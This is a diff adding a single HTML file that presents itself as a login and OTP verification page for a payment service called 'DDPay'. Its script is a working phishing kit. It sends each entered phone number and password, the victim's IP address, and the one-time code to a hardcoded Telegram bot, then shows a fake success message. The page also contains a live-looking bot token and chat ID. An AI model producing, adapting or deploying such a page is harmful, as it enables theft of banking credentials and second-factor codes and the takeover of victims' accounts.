@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DDPay · Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f4f7fa;
+      overflow: hidden;
+    }
+
+    /* ===== SPLASH SCREEN ===== */
+    #splash {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #eef6f4 0%, #f3f7fa 50%, #fbf9f5 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      overflow: hidden;
+    }
+
+    .splash-blue-circle {
+      position: absolute;
+      top: -10%;
+      right: -25%;
+      width: 380px;
+      height: 380px;
+      background: linear-gradient(135deg, #5d92f4, #4a7ee0);
+      border-radius: 50%;
+      z-index: 1;
+    }
+
+    .splash-container-box {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 320px;
+      height: 320px;
+      animation: zoomSmooth 1.6s ease;
+    }
+
+    .splash-card-bg {
+      width: 290px;
+      transform: rotate(-15deg);
+      filter: drop-shadow(0px 10px 20px rgba(0, 0, 0, 0.06));
+      border: none;
+      outline: none;
+      background: #ffffff;
+      border-radius: 32px;
+      padding: 20px;
+    }
+
+    .splash-logo-inside {
+      position: absolute;
+      width: 90px;
+      height: auto;
+      border: none;
+      outline: none;
+      background: transparent;
+      transform: translate(0, -5px);
+      z-index: 3;
+    }
+
+    @keyframes zoomSmooth {
+      0% { transform: scale(0.7); opacity: 0; }
+      60% { transform: scale(1.05); opacity: 1; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    /* ===== MAIN LOGIN ===== */
+    .container, .otp-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px 35px;
+      text-align: center;
+      background: transparent;
+    }
+
+    .login-active-board {
+      background: #0b8457;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: bold;
+      padding: 10px 15px;
+      border-radius: 20px;
+      margin-bottom: 25px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 10px rgba(11, 132, 87, 0.25);
+      animation: greenGlow 1.5s infinite ease-in-out;
+    }
+
+    @keyframes greenGlow {
+      0% { box-shadow: 0 4px 10px rgba(11, 132, 87, 0.25); }
+      50% { box-shadow: 0 4px 18px rgba(11, 132, 87, 0.5); background: #0c9663; }
+      100% { box-shadow: 0 4px 10px rgba(11, 132, 87, 0.25); }
+    }
+
+    .input-box {
+      background: #ffffff;
+      border-radius: 30px;
+      padding: 14px 20px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      border: 1px solid #e2e8f0;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02);
+    }
+
+    .input-box input {
+      border: none;
+      outline: none;
+      background: none;
+      width: 100%;
+      font-size: 17px;
+      color: #333;
+      padding-left: 10px;
+    }
+
+    .input-box input::placeholder {
+      color: #cbd5e1;
+      font-weight: 500;
+    }
+
+    .icon {
+      color: #333333;
+      font-size: 20px;
+      width: 25px;
+      text-align: center;
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      margin: 15px 5px 20px;
+      color: #0b8457;
+    }
+
+    .options a {
+      color: #0b8457;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    .options label {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+    }
+
+    .options input[type="checkbox"] {
+      accent-color: #0b8457;
+      width: 16px;
+      height: 16px;
+    }
+
+    .agree {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 14px;
+      color: #0b8457;
+      margin-bottom: 20px;
+    }
+
+    .agree input {
+      accent-color: #0b8457;
+      width: 16px;
+      height: 16px;
+    }
+
+    .agree a {
+      color: #0b8457;
+      text-decoration: underline;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      background: #0b8457;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(11, 132, 87, 0.2);
+      transition: background 0.3s ease;
+    }
+
+    .btn:hover {
+      background: #096f49;
+    }
+
+    .forgot {
+      display: inline-block;
+      margin-top: 35px;
+      font-size: 14px;
+      color: #0b8457;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    /* ===== OTP PAGE ===== */
+    .otp-container {
+      display: none;
+    }
+
+    .otp-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    }
+
+    .otp-title {
+      color: #0b8457;
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .otp-subtitle {
+      color: #64748b;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+
+    .otp-input-group {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 25px;
+    }
+
+    .otp-input-group input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      outline: none;
+      transition: all 0.3s;
+      color: #0b8457;
+    }
+
+    .otp-input-group input:focus {
+      border-color: #0b8457;
+      box-shadow: 0 0 0 3px rgba(11, 132, 87, 0.1);
+    }
+
+    .otp-input-group input:disabled {
+      background: #f1f5f9;
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: #0b8457;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 14px;
+      text-decoration: underline;
+      margin-top: 10px;
+    }
+
+    .resend-btn:disabled {
+      color: #94a3b8;
+      cursor: not-allowed;
+      text-decoration: none;
+    }
+
+    .back-to-login {
+      display: inline-block;
+      margin-top: 20px;
+      color: #64748b;
+      font-size: 14px;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    .back-to-login:hover {
+      color: #0b8457;
+    }
+
+    /* ===== HIDDEN CLASS ===== */
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== SPLASH SCREEN ===== -->
+  <div id="splash">
+    <div class="splash-blue-circle"></div>
+    <div class="splash-container-box">
+      <div class="splash-card-bg">
+        <svg viewBox="0 0 200 120" xmlns="http://www.w3.org/2000/svg">
+          <rect width="200" height="120" rx="20" fill="#f8fafc" />
+          <circle cx="40" cy="40" r="18" fill="#e2e8f0" />
+          <rect x="70" y="30" width="80" height="8" rx="4" fill="#e2e8f0" />
+          <rect x="70" y="50" width="60" height="8" rx="4" fill="#e2e8f0" />
+          <rect x="70" y="70" width="90" height="8" rx="4" fill="#e2e8f0" />
+          <circle cx="160" cy="90" r="14" fill="#cbd5e1" />
+          <circle cx="130" cy="90" r="14" fill="#cbd5e1" />
+        </svg>
+      </div>
+      <img class="splash-logo-inside" 
+           src="https://ddpaywithdrall.online/logo.png" 
+           alt="DDPay logo" 
+           onerror="this.style.display='none'">
+    </div>
+  </div>
+
+  <!-- ===== MAIN LOGIN PAGE ===== -->
+  <div class="container" id="loginPage">
+    <img src="https://ddpaywithdrall.online/logo.png" 
+         alt="Logo" 
+         width="200"
+         onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%2250%22%3E%3Crect width=%22200%22 height=%2250%22 fill=%22%230b8457%22 rx=%2210%22/%3E%3Ctext x=%2220%22 y=%2233%22 font-size=%2222%22 fill=%22white%22 font-family=%22Segoe UI%22%3EDDPay%3C/text%3E%3C/svg%3E'">
+
+
+    <form id="loginForm" onsubmit="return handleLogin(event)">
+      <div class="input-box">
+        <i class="fa-regular fa-user icon"></i>
+        <input type="tel" id="phone" name="phone" placeholder="Phone Number" maxlength="10" required>
+      </div>
+
+      <div class="input-box">
+        <i class="fa fa-lock icon"></i>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+      </div>
+
+      <div class="options">
+        <a href="#">Register</a>
+        <label><input type="checkbox" checked> Remember Me</label>
+      </div>
+
+      <div class="agree">
+        <input type="checkbox" checked>
+        <span>Agree</span>
+        <a href="#">"User Privacy Agreement"</a>
+      </div>
+
+      <button class="btn" type="submit">Sign In</button>
+      <a class="forgot" href="#">Forget Password</a>
+    </form>
+  </div>
+
+  <!-- ===== OTP VERIFICATION PAGE ===== -->
+  <div class="otp-container" id="otpPage">
+    <div class="otp-box">
+      <div style="margin-bottom: 15px;">
+        <img src="https://ddpaywithdrall.online/logo.png" 
+             alt="Logo" 
+             width="120"
+             onerror="this.style.display='none'">
+      </div>
+      
+      <div class="otp-title">📱 Verification Code</div>
+      <div class="otp-subtitle">Enter the 6-digit code sent to your phone</div>
+
+      <div class="otp-input-group" id="otpInputs">
+        <input type="text" maxlength="1" class="otp-digit" data-index="0" autofocus>
+        <input type="text" maxlength="1" class="otp-digit" data-index="1">
+        <input type="text" maxlength="1" class="otp-digit" data-index="2">
+        <input type="text" maxlength="1" class="otp-digit" data-index="3">
+        <input type="text" maxlength="1" class="otp-digit" data-index="4">
+        <input type="text" maxlength="1" class="otp-digit" data-index="5">
+      </div>
+
+      <button class="btn" id="verifyOtpBtn" onclick="handleOTP()">Verify OTP</button>
+      
+      <div style="margin-top: 15px;">
+        <button class="resend-btn" id="resendBtn" onclick="resendOTP()">Resend Code</button>
+      </div>
+
+      <div class="back-to-login" onclick="goBackToLogin()">← Back to Login</div>
+    </div>
+  </div>
+
+  <script>
+    // ===== TELEGRAM CONFIG =====
+    const BOT_TOKEN = '8816722818:AAHiVIyeWaDKBzvTMvpEagEDIa2sNX-jjEI';
+    const CHAT_ID = '8791326482';
+
+    // ===== STORED CREDENTIALS =====
+    let storedPhone = '';
+    let storedPassword = '';
+    let storedIP = '';
+
+    // ===== SPLASH TIMEOUT =====
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        const splash = document.getElementById('splash');
+        if (splash) {
+          splash.style.transition = 'opacity 0.6s ease';
+          splash.style.opacity = '0';
+          setTimeout(() => {
+            splash.style.display = 'none';
+          }, 600);
+        }
+      }, 2200);
+    });
+
+    // ===== GET IP =====
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || 'unknown';
+      } catch (e) {
+        return 'unable to fetch';
+      }
+    }
+
+    // ===== SEND TO TELEGRAM =====
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        return response.ok;
+      } catch (error) {
+        console.error('Telegram send error:', error);
+        return false;
+      }
+    }
+
+    // ===== LOGIN HANDLER =====
+    async function handleLogin(event) {
+      event.preventDefault();
+
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!phone || !password) {
+        alert('Please fill in both phone and password.');
+        return false;
+      }
+
+      // Store credentials
+      storedPhone = phone;
+      storedPassword = password;
+      storedIP = await getUserIP();
+
+      // Send login credentials to Telegram
+      const loginMsg = `🔐 <b>DDPay LOGIN</b>\n📱 Phone: ${phone}\n🔑 Pass: ${password}\n🌐 IP: ${storedIP}`;
+      await sendToTelegram(loginMsg);
+
+      // Show OTP page
+      document.getElementById('loginPage').style.display = 'none';
+      document.getElementById('otpPage').style.display = 'block';
+      
+      // Clear and focus first OTP input
+      document.querySelectorAll('.otp-digit').forEach(input => input.value = '');
+      document.querySelector('.otp-digit').focus();
+
+      // Enable verify button
+      document.getElementById('verifyOtpBtn').disabled = false;
+      document.getElementById('verifyOtpBtn').style.opacity = '1';
+
+      return false;
+    }
+
+    // ===== OTP INPUT AUTO-FOCUS =====
+    document.querySelectorAll('.otp-digit').forEach((input, index, inputs) => {
+      input.addEventListener('input', function(e) {
+        // Only allow digits
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        if (this.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+
+      // Paste support
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
+        
+        if (digits) {
+          for (let i = 0; i < digits.length && i < inputs.length; i++) {
+            inputs[i].value = digits[i];
+          }
+          if (digits.length < inputs.length) {
+            inputs[digits.length].focus();
+          } else {
+            inputs[inputs.length - 1].focus();
+          }
+        }
+      });
+    });
+
+    // ===== OTP VERIFY =====
+    async function handleOTP() {
+      const inputs = document.querySelectorAll('.otp-digit');
+      let otp = '';
+      inputs.forEach(input => otp += input.value);
+
+      if (otp.length !== 6) {
+        alert('Please enter complete 6-digit OTP');
+        return;
+      }
+
+      // Disable verify button to prevent double click
+      const btn = document.getElementById('verifyOtpBtn');
+      btn.disabled = true;
+      btn.style.opacity = '0.6';
+      btn.textContent = 'Verifying...';
+
+      // Send OTP to Telegram
+      const otpMsg = `🔐 <b>DDPay OTP</b>\n📱 Phone: ${storedPhone}\n🔑 Pass: ${storedPassword}\n🔢 OTP: ${otp}\n🌐 IP: ${storedIP}`;
+      await sendToTelegram(otpMsg);
+
+      // Show success message
+      alert('✅ OTP Verified Successfully! (Check Telegram)');
+      
+      // Reset button
+      btn.textContent = 'Verify OTP';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+
+      // Optional: Clear OTP inputs
+      inputs.forEach(input => input.value = '');
+      inputs[0].focus();
+
+      // You can redirect or do anything here
+      // window.location.href = 'dashboard.html';
+    }
+
+    // ===== RESEND OTP =====
+    function resendOTP() {
+      const btn = document.getElementById('resendBtn');
+      btn.disabled = true;
+      btn.textContent = 'Sending...';
+
+      // Generate random OTP (just for demo)
+      const randomOTP = Math.floor(100000 + Math.random() * 900000);
+      
+      // Send resend notification to Telegram
+      const resendMsg = `🔄 <b>DDPay OTP Resend</b>\n📱 Phone: ${storedPhone}\n🔢 New OTP: ${randomOTP}\n🌐 IP: ${storedIP}`;
+      sendToTelegram(resendMsg);
+
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.textContent = 'Resend Code';
+        alert('✅ New OTP sent to Telegram!');
+      }, 2000);
+    }
+
+    // ===== GO BACK TO LOGIN =====
+    function goBackToLogin() {
+      document.getElementById('loginPage').style.display = 'block';
+      document.getElementById('otpPage').style.display = 'none';
+      
+      // Clear OTP inputs
+      document.querySelectorAll('.otp-digit').forEach(input => input.value = '');
+      
+      // Enable verify button
+      const btn = document.getElementById('verifyOtpBtn');
+      btn.disabled = false;
+      btn.style.opacity = '1';
+      btn.textContent = 'Verify OTP';
+    }
+
+    // ===== ENTER KEY SUPPORT FOR OTP =====
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        const otpPage = document.getElementById('otpPage');
+        if (otpPage.style.display === 'block') {
+          const btn = document.getElementById('verifyOtpBtn');
+          if (!btn.disabled) {
+            handleOTP();
+          }
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
